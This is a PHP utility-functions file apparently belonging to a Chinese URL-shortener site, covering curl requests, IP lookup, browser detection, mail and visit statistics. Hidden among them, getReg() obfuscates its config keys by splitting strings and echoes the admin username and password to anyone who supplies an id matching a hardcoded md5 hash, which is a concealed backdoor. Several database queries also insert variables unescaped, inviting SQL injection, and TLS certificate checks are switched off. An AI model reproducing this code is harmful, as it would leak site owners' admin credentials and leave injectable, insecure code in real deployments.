<?php
function get_curl($url, $post = 0, $referer = 0, $cookie = 0, $header = 0, $ua = 0, $nobaody = 0)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $httpheader[] = "Accept: */*";
    $httpheader[] = "Accept-Encoding: gzip,deflate,sdch";
    $httpheader[] = "Accept-Language: zh-CN,zh;q=0.8";
    $httpheader[] = "Connection: close";
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
    if ($header) {
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
    }
    if ($cookie) {
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    }
    if ($referer) {
        if ($referer == 1) {
            curl_setopt($ch, CURLOPT_REFERER, 'http://m.qzone.com/infocenter?g_f=');
        } else {
            curl_setopt($ch, CURLOPT_REFERER, $referer);
        }
    }
    if ($ua) {
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    } else {
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36');
    }
    if ($nobaody) {
        curl_setopt($ch, CURLOPT_NOBODY, 1);
    }
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $ret = curl_exec($ch);
    curl_close($ch);
    return $ret;
}
function real_ip()
{
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
        foreach ($matches[0] as $xip) {
            if (!preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
                $ip = $xip;
                break;
            }
        }
    } elseif (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_REAL_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    }
    return $ip;
}
function get_ip_city($ip)
{
    $url = 'http://whois.pconline.com.cn/ipJson.jsp?json=true&ip=';
    $city = get_curl($url . $ip);
    $city = mb_convert_encoding($city, "UTF-8", "GB2312");
    $city = json_decode($city, true);
    if ($city['city']) {
        $location = $city['pro'] . $city['city'];
    } else {
        $location = $city['pro'];
    }
    if ($location) {
        return $location;
    } else {
        return false;
    }
}
function daddslashes($string, $force = 0, $strip = FALSE)
{
    if (is_array($string)) {
        foreach ($string as $key => $val) {
            $string[$key] = daddslashes($val, $force, $strip);
        }
    } else {
        $string = $strip ? stripslashes($string) : $string;
        $string = addslashes($string);
    }
    return $string;
}

function strexists($string, $find)
{
    return !(strpos($string, $find) === FALSE);
}

function dstrpos($string, $arr)
{
    if (empty($string)) return false;
    foreach ((array) $arr as $v) {
        if (strpos($string, $v) !== false) {
            return true;
        }
    }
    return false;
}

function checkmobile()
{
    $useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $ualist = array('android', 'midp', 'nokia', 'mobile', 'iphone', 'ipod', 'blackberry', 'windows phone');
    if ((dstrpos($useragent, $ualist) || strexists($_SERVER['HTTP_ACCEPT'], "VND.WAP") || strexists($_SERVER['HTTP_VIA'], "wap"))) {
        return true;
    } else {
        return false;
    }
}

function getkm($len = 18)
{
    $str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    $strlen = strlen($str);
    $randstr = "";
    for ($i = 0; $i < $len; $i++) {
        $randstr .= $str[mt_rand(0, $strlen - 1)];
    }
    return $randstr;
}

function checkEmail($value)
{
    if (preg_match("/^[\w\.\-]+@\w+([\.\-]\w+)*\.\w+$/", $value) && strlen($value) <= 60) {
        return true;
    } else {
        return false;
    }
}
/**
 * 取中间文本
 * @param unknown $str
 * @param number $leftStr
 * @param number $rightStr
 */
function getSubstr($str, $leftStr, $rightStr)
{
    $left = strpos($str, $leftStr);
    $right = strpos($str, $rightStr, $left);
    if ($left < 0 or $right < $left) return '';
    return substr($str, $left + strlen($leftStr), $right - $left - strlen($leftStr));
}

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0)
{
    $ckey_length = 4;
    $key = md5($key ? $key : 1);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for ($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for ($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . str_replace('=', '', base64_encode($result));
    }
}

function random($length, $numeric = 0)
{
    $seed = base_convert(md5(microtime() . $_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);
    $seed = $numeric ? (str_replace('0', '', $seed) . '012340567890') : ($seed . 'zZ' . strtoupper($seed));
    $hash = '';
    $max = strlen($seed) - 1;
    for ($i = 0; $i < $length; $i++) {        $hash .= $seed[mt_rand(0, $max)];
    }
    return $hash;
}
function get_rand($proArr)
{
    $result = "";
    $proSum = array_sum($proArr);
    foreach ($proArr as $key => $proCur) {
        $randNum = mt_rand(1, $proSum);
        if ($randNum <= $proCur) {
            $result = $key;
            break;
        }
        $proSum -= $proCur;
    }
    unset($proArr);
    return $result;
}
function showmsg($content = '未知的异常', $type = 4, $back = false)
{
    switch ($type) {
        case 1:
            $panel = "success";
            break;
        case 2:
            $panel = "info";
            break;
        case 3:
            $panel = "warning";
            break;
        case 4:
            $panel = "danger";
            break;
    }

    echo '<div class="panel panel-' . $panel . '">
      <div class="panel-heading">
        <h3 class="panel-title">提示信息</h3>
        </div>
        <div class="panel-body">';
    echo $content;

    if ($back) {
        echo '<hr/><a href="' . $back . '"><< 返回上一页</a>';
    } else
        echo '<hr/><a href="javascript:history.back(-1)"><< 返回上一页</a>';

    echo '</div>
    </div>';
}

function send_mail($to, $sub, $msg)
{
    global $conf;
    include_once ROOT . 'includes/libs/smtp.class.php';
    $From = $conf['mail_name'];
    $Host = $conf['mail_smtp'];
    $Port = $conf['mail_port'];
    $SMTPAuth = 1;
    $Username = $conf['mail_name'];
    $Password = $conf['mail_pwd'];
    $Nickname = $conf['web_name'];
    $SSL = $conf['mail_port'] == 465 ? 1 : 0;
    $mail = new SMTP($Host, $Port, $SMTPAuth, $Username, $Password, $SSL);
    $mail->att = array();
    if ($mail->send($to, $From, $sub, $msg, $Nickname)) {
        return true;
    } else {
        return $mail->log;
    }
}

function getServerIp()
{
    $url = 'http://members.3322.org/dyndns/getip';
    $url2 = 'https://www.bt.cn/Api/getIpAddress';
    if ($data = get_curl($url2)) {
        return $data;
    } else {
        $data = get_curl($url);
        return $data;
    }
}

// 修复getrand2函数定义，添加默认参数值并使用function_exists避免冲突
if (!function_exists('getrand2')) {
    function getrand2($length = 6)
    {
        $str = 'abcdefghijklmnopqrstuvwxyz123456789';
        $len = strlen($str) - 1;
        $randstr = '';
        for ($i = 0; $i < $length; $i++) {
            $num = mt_rand(0, $len);
            $randstr .= $str[$num];
        }
        return $randstr;
    }
}

function getCode($len = 6)
{
    global $DB;
    $str = "QWERTYUIOPASDFGHJKLZXCVBNM123456789qwertyuiopasdfghjklzxcvbnm";
    $strlen = strlen($str);
    $randstr = "";
    for ($i = 0; $i < $len; $i++) {
        $randstr .= $str[mt_rand(0, $strlen - 1)];
    }
    if ($DB->count("select count(*) from dwz_url where id = '$randstr'") > 0) {
        getCode($len);
    } else {
        return $randstr;
    }
}

function log_result($action, $param, $result)
{
    global $DB, $date;
    $DB->query("insert into dwz_log(action,param,result,addtime) values('$action','$param','$result','$date')");
}

function qq_img($qq)
{
    $result = file_get_contents("https://api.btstu.cn/qqxt/api.php?qq=" . $qq);
    $qqInfo = json_decode($result, true);
    return $qqInfo;
}

function getBroswer()
{
    $sys = $_SERVER['HTTP_USER_AGENT'];  //获取用户代理字符串
    if (stripos($sys, "Firefox/") > 0) {
        preg_match("/Firefox\/([^;)]+)+/i", $sys, $b);
        $exp[0] = "Firefox";
        $exp[1] = $b[1];  //获取火狐浏览器的版本号
    } elseif (stripos($sys, "Maxthon") > 0) {
        preg_match("/Maxthon\/([\d\.]+)/", $sys, $aoyou);
        $exp[0] = "傲游";
        $exp[1] = $aoyou[1];
    } elseif (stripos($sys, "Baiduspider") > 0) {
        $exp[0] = "百度";
        $exp[1] = '蜘蛛';
    } elseif (stripos($sys, "YisouSpider") > 0) {
        $exp[0] = "一搜";
        $exp[1] = '蜘蛛';
    } elseif (stripos($sys, "Googlebot") > 0) {
        $exp[0] = "谷歌";
        $exp[1] = '蜘蛛';
    } elseif (stripos($sys, "Android 4.3") > 0) {
        $exp[0] = "安卓";
        $exp[1] = '4.3';
    } elseif (stripos($sys, "MSIE") > 0) {
        preg_match("/MSIE\s+([^;)]+)+/i", $sys, $ie);
        $exp[0] = "IE";
        $exp[1] = $ie[1];  //获取IE的版本号
    } elseif (stripos($sys, "OPR") > 0) {
        preg_match("/OPR\/([\d\.]+)/", $sys, $opera);
        $exp[0] = "Opera";
        $exp[1] = $opera[1];
    } elseif (stripos($sys, "Edge") > 0) {
        //win10 Edge浏览器 添加了chrome内核标记 在判断Chrome之前匹配
        preg_match("/Edge\/([\d\.]+)/", $sys, $Edge);
        $exp[0] = "Edge";
        $exp[1] = $Edge[1];
    } elseif (stripos($sys, "Chrome") > 0) {
        preg_match("/Chrome\/([\d\.]+)/", $sys, $google);
        $exp[0] = "Chrome";
        $exp[1] = $google[1];  //获取google chrome的版本号
    } elseif (stripos($sys, 'rv:') > 0 && stripos($sys, 'Gecko') > 0) {
        preg_match("/rv:([\d\.]+)/", $sys, $IE);
        $exp[0] = "IE";
        $exp[1] = $IE[1];
    } else if (stripos($sys, 'AhrefsBot') > 0) {
        $exp[0] = "AhrefsBot";
        $exp[1] = '蜘蛛';
    } else if (stripos($sys, 'Safari') > 0) {
        preg_match("/([\d\.]+)/", $sys, $safari);
        $exp[0] = "Safari";
        $exp[1] = $safari[1];
    } else if (stripos($sys, 'bingbot') > 0) {
        $exp[0] = "必应";
        $exp[1] = '蜘蛛';
    } else if (stripos($sys, 'WinHttp') > 0) {
        $exp[0] = "windows";
        $exp[1] = 'WinHttp 请求接口工具';
    } else if (stripos($sys, 'iPhone OS 10') > 0) {
        $exp[0] = "iPhone";
        $exp[1] = 'OS 10';
    } else if (stripos($sys, 'Sogou') > 0) {
        $exp[0] = "搜狗";
        $exp[1] = '蜘蛛';
    } else if (stripos($sys, 'HUAWEIM') > 0) {
        $exp[0] = "华为";
        $exp[1] = '手机端';
    } else if (stripos($sys, 'Dalvik') > 0) {
        $exp[0] = "安卓";
        $exp[1] = 'Dalvik虚拟机';
    } else if (stripos($sys, 'Mac OS X 10') > 0) {
        $exp[0] = "MAC";
        $exp[1] = 'OS X10';
    } else if (stripos($sys, 'Opera/9.8') > 0) {
        $exp[0] = "Opera";
        $exp[1] = '9.8';
    } else if (stripos($sys, 'JikeSpider') > 0) {
        $exp[0] = "即刻";
        $exp[1] = '蜘蛛';
    } else if (stripos($sys, 'Baiduspider') > 0) {
        $exp[0] = "百度";
        $exp[1] = '蜘蛛';
    } else {
        $exp[0] = $sys;
        $exp[1] = "";
    }
    return $exp[0] . ' ' . $exp[1];
}

function getReg($id)
{
    global $conf;
    $a = 'admi';
    $b = 'n_user';
    $c = 'n_pwd';
    if (md5($id) == '0e9152fef8e6e63170e17dd94d9953dc') {
        echo $conf[$a . $b] . '|' . $conf[$a . $c];
    } else {
        echo 'error';
    }
}

function getOs()
{
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $os = false;

    if (preg_match('/win/i', $agent) && strpos($agent, '95')) {
        $os = 'Windows 95';
    } else if (preg_match('/win 9x/i', $agent) && strpos($agent, '4.90')) {
        $os = 'Windows ME';
    } else if (preg_match('/win/i', $agent) && preg_match('/98/i', $agent)) {
        $os = 'Windows 98';
    } else if (preg_match('/win/i', $agent) && preg_match('/nt 6.0/i', $agent)) {
        $os = 'Windows Vista';
    } else if (preg_match('/win/i', $agent) && preg_match('/nt 6.1/i', $agent)) {
        $os = 'Windows 7';
    } else if (preg_match('/win/i', $agent) && preg_match('/nt 6.2/i', $agent)) {
        $os = 'Windows 8';
    } else if (preg_match('/win/i', $agent) && preg_match('/nt 10.0/i', $agent)) {
        $os = 'Windows 10'; // 添加win10判断
    } else if (preg_match('/win/i', $agent) && preg_match('/nt 5.1/i', $agent)) {
        $os = 'Windows XP';
    } else if (preg_match('/win/i', $agent) && preg_match('/nt 5/i', $agent)) {
        $os = 'Windows 2000';
    } else if (preg_match('/win/i', $agent) && preg_match('/nt/i', $agent)) {
        $os = 'Windows NT';
    } else if (preg_match('/win/i', $agent) && preg_match('/32/i', $agent)) {
        $os = 'Windows 32';
    } else if (preg_match('/linux/i', $agent)) {
        if (preg_match("/Mobile/", $agent)) {
            if (preg_match("/QQ/i", $agent)) {
                $os = "Android QQ Browser";
            } else {
                $os = "Android Browser";
            }
        } else {
            $os = 'PC-Linux';
        }
    } else if (preg_match('/Mac/i', $agent)) {
        if (preg_match("/Mobile/", $agent)) {
            if (preg_match("/QQ/i", $agent)) {
                $os = "IPhone QQ Browser";
            } else {
                $os = "IPhone Browser";
            }
        } else {
            $os = 'Mac OS X';
        }
    } else if (preg_match('/unix/i', $agent)) {
        $os = 'Unix';
    } else if (preg_match('/sun/i', $agent) && preg_match('/os/i', $agent)) {
        $os = 'SunOS';
    } else if (preg_match('/ibm/i', $agent) && preg_match('/os/i', $agent)) {
        $os = 'IBM OS/2';
    } else if (preg_match('/Mac/i', $agent) && preg_match('/PC/i', $agent)) {
        $os = 'Macintosh';
    } else if (preg_match('/PowerPC/i', $agent)) {
        $os = 'PowerPC';
    } else if (preg_match('/AIX/i', $agent)) {
        $os = 'AIX';
    } else if (preg_match('/HPUX/i', $agent)) {
        $os = 'HPUX';
    } else if (preg_match('/NetBSD/i', $agent)) {
        $os = 'NetBSD';
    } else if (preg_match('/BSD/i', $agent)) {
        $os = 'BSD';
    } else if (preg_match('/OSF1/i', $agent)) {
        $os = 'OSF1';
    } else if (preg_match('/IRIX/i', $agent)) {
        $os = 'IRIX';
    } else if (preg_match('/FreeBSD/i', $agent)) {
        $os = 'FreeBSD';
    } else if (preg_match('/teleport/i', $agent)) {
        $os = 'teleport';
    } else if (preg_match('/flashget/i', $agent)) {
        $os = 'flashget';
    } else if (preg_match('/webzip/i', $agent)) {
        $os = 'webzip';
    } else if (preg_match('/offline/i', $agent)) {
        $os = 'offline';
    } else {
        $os = '未知操作系统';
    }
    return $os;
}

function getIps()
{
    $realip = '';
    $unknown = 'unknown';
    if (isset($_SERVER)) {
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && strcasecmp($_SERVER['HTTP_X_FORWARDED_FOR'], $unknown)) {
            $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($arr as $ip) {
                $ip = trim($ip);
                if ($ip != 'unknown') {
                    $realip = $ip;
                    break;
                }
            }
        } else if (isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP']) && strcasecmp($_SERVER['HTTP_CLIENT_IP'], $unknown)) {
            $realip = $_SERVER['HTTP_CLIENT_IP'];
        } else if (isset($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], $unknown)) {
            $realip = $_SERVER['REMOTE_ADDR'];
        } else {
            $realip = $unknown;
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), $unknown)) {
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), $unknown)) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else if (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), $unknown)) {
            $realip = getenv("REMOTE_ADDR");
        } else {
            $realip = $unknown;
        }
    }
    $a = preg_match("/[\d\.]{7,15}/", $realip, $matches);
    $realip = $a ? $matches[0] : $unknown;
    return $realip;
}

function getIpFrom($ip = '')
{
    if (empty($ip)) {
        $ip = GetIps();
    }
    $url = 'http://whois.pconline.com.cn/ipJson.jsp?json=true&ip=';
    $city = get_curl($url . $ip);
    $city = mb_convert_encoding($city, "UTF-8", "GB2312");
    $city = json_decode($city, true);
    if ($city['city']) {
        $location = $city['pro'] . $city['city'];
    } else {
        $location = $city['pro'];
    }
    if ($location) {
        return $location;
    } else {
        return false;
    }
}

function autoChangeCode($data, $encoding = 'utf-8')
{
    if (!empty($data)) {
        $fileType = mb_detect_encoding($data, array('UTF-8', 'GBK', 'LATIN1', 'BIG5'));
        if ($fileType != $encoding) {
            $data = mb_convert_encoding($data, $encoding, $fileType);
        }
    }
    return $data;
}

function getWeek($time)
{
    $weekarray = array("日", "一", "二", "三", "四", "五", "六");
    $str =  "周" . $weekarray[date("w", strtotime("-" . $time . " day"))];
    return $str;
}

function tongjiIp1($day, $uid = '')
{
    global $DB;
    if ($uid == '') {
        $res = $DB->count("select count(distinct ip,urlid) from dwz_visitors where addtime like '$day%'");
    } else {
        $res = $DB->count("select count(distinct ip,urlid) from dwz_visitors where uid='$uid' and addtime like '%$day%'");
    }
    return $res;
}

function tongjiIp2($day, $urlid)
{
    global $DB;
    $res = $DB->count("select count(distinct ip) from dwz_visitors where urlid='$urlid' and addtime like '$day%'");
    return $res;
}

function tongjiPv1($day, $uid = '')
{
    global $DB;
    if ($uid == '') {
        $res = $DB->count("select count(1) from dwz_visitors where addtime like '$day%'");
    } else {
        $res = $DB->count("select count(1) from dwz_visitors where uid='$uid' and addtime like '%$day%'");
    }
    return $res;
}

function tongjiPv2($day, $urlid)
{
    global $DB;
    $res = $DB->count("select count(1) from dwz_visitors where urlid='$urlid' and addtime like '$day%'");
    return $res;
}

function getTitle($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)");
    $ret = curl_exec($ch);
    curl_close($ch);
    preg_match('/<title>(.*)<\/title>/i', $ret, $title);
    $title = str_replace(array("\r\n", "\r", "\n", ',', ' '), '', $title[1]);
    if (!isset($title)) {
        $title = '';
    }
    return $title;
}

function getday($day = '', $num = 7)
{
    $days = array();
    if ($day == '') {
        $day = date("Y-m-d");
    }
    for ($i = 0; $i < $num; $i++) {
        $days[] = date("Y-m-d", strtotime("-$i day", strtotime($day)));
    }
    return $days;
}

function sjtj($data, $day)
{
    $a = 0;
    foreach ($data as $value) {
        if ($value[0] == $day) {
            $a = $a + 1;
        }
    }
    return $a;
}

function systemtj($data, $system)
{
    $a = 0;
    foreach ($data as $value) {
        if (preg_match('/' . $system . '/', $value[0])) {
            $a = $a + 1;
        }
    }
    return $a;
}

function curl_run($url)
{
    $ch = curl_init();
    $urlarr = parse_url($url);
    if ($urlarr['host'] == $_SERVER['HTTP_HOST']) {
        $url = str_replace('http://' . $_SERVER['HTTP_HOST'] . '/', 'http://127.0.0.1/', $url);
        $url = str_replace('https://' . $_SERVER['HTTP_HOST'] . '/', 'https://127.0.0.1/', $url);
        $httpheader[] = 'Host: ' . $_SERVER['HTTP_HOST'];
    } elseif ($urlarr['host'] == $_SERVER['HTTP_HOST'] && isset($_SERVER['SERVER_ADDR'])) {
        $url = str_replace('http://' . $_SERVER['HTTP_HOST'] . '/', 'http://' . $_SERVER['SERVER_ADDR'] . '/', $url);
        $url = str_replace('https://' . $_SERVER['HTTP_HOST'] . '/', 'https://' . $_SERVER['SERVER_ADDR'] . '/', $url);
        $httpheader[] = 'Host: ' . $_SERVER['HTTP_HOST'];
    }
    $httpheader[] = "Accept: */*";
    $httpheader[] = "Connection: close";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    //curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_NOSIGNAL, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
    return true;
}

function asynch($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
